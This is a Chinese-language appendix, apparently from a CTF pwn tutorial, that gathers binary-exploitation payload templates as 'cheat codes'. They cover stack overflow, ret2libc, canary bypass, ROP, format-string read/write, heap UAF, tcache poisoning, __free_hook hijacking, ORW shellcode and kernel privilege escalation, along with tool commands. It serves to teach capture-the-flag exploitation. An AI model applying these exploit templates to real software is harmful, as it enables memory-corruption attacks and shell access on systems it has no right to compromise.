# 附录 B · 闯关作弊码速查(payload 模板)

> 游戏作弊码合集。遇到对应场景,复制改改就能用。

## ⚔️ 栈类作弊码

### 1. 基础栈溢出(ret2text)

```python
payload = b'A' * offset + p64(后门函数地址)
```

### 2. ret2libc(两步走)

```python
# 第一轮:泄露
payload = b'A'*offset + p64(pop_rdi) + p64(elf.got['puts']) \
        + p64(elf.plt['puts']) + p64(elf.sym['main'])
# 第二轮:system
payload = b'A'*offset + p64(pop_rdi) + p64(binsh) \
        + p64(ret) + p64(system)
```

### 3. Canary 绕过

```python
payload = b'A'*buf_size + p64(canary) + b'A'*8 + p64(target)
```

### 4. ROP 拼链

```python
rop = ROP(elf)
rop.system(next(libc.search(b'/bin/sh\x00')))
payload = b'A'*offset + rop.chain()
```

---

## 🔮 格式化字符串作弊码

```python
# 任意地址读
payload = p64(addr) + b'%N$s'

# 任意地址写
payload = fmtstr_payload(N, {addr: value})

# 泄露栈上值
payload = b'%N$p'
```

---

## 🏰 堆类作弊码

### UAF 改写函数指针

```python
edit(chunk, p64(system) + b'/bin/sh\x00')
# 触发原函数指针调用 → system("/bin/sh")
```

### tcache poisoning

```python
delete(a)
# UAF写next(target)
edit(a, p64(target))     # 2.32+需safe-linking编码
malloc(); malloc()       # 第二次返回target
```

### __free_hook 劫持

```python
# 让malloc返回free_hook地址,写入system
add(idx, size, p64(system))
add(idx2, size, b'/bin/sh\x00')
delete(idx2)    # system("/bin/sh")
```

---

## 🌋 沙箱/内核作弊码

### ORW shellcode

```python
sc  = shellcraft.open('flag')
sc += shellcraft.read('rax', 'rsp', 0x40)
sc += shellcraft.write(1, 'rsp', 0x40)
```

### 内核提权(经典组合)

```c
commit_creds(prepare_kernel_cred(0));
```

---

## 🧰 常用命令速查

```bash
checksec --file=vuln              # 看保护
nm vuln | grep system             # 找函数
strings -a -t x vuln | grep /bin/sh  # 找字符串
objdump -d -M intel vuln          # 反汇编
ROPgadget --binary vuln --only "pop|ret"  # 找gadget
seccomp-tools dump ./vuln         # 看沙箱规则
ldd vuln                          # 看链接的libc
cyclic_find($rsp)                 # gdb里算偏移
```

---

## 🎯 通用解题节奏

```
1. checksec      → 看保护,定策略
2. 运行+逆向     → 找漏洞、找材料(函数/字符串)
3. 测偏移/泄露   → cyclic / 泄露libc
4. 构造payload   → 复制模板改参数
5. gdb调试       → 崩了就看栈和寄存器
6. interactive   → cat flag
```

---

**作弊码用多了要理解原理哦!** 遇到新题,先问"保护开了什么""漏洞在哪",再选作弊码。
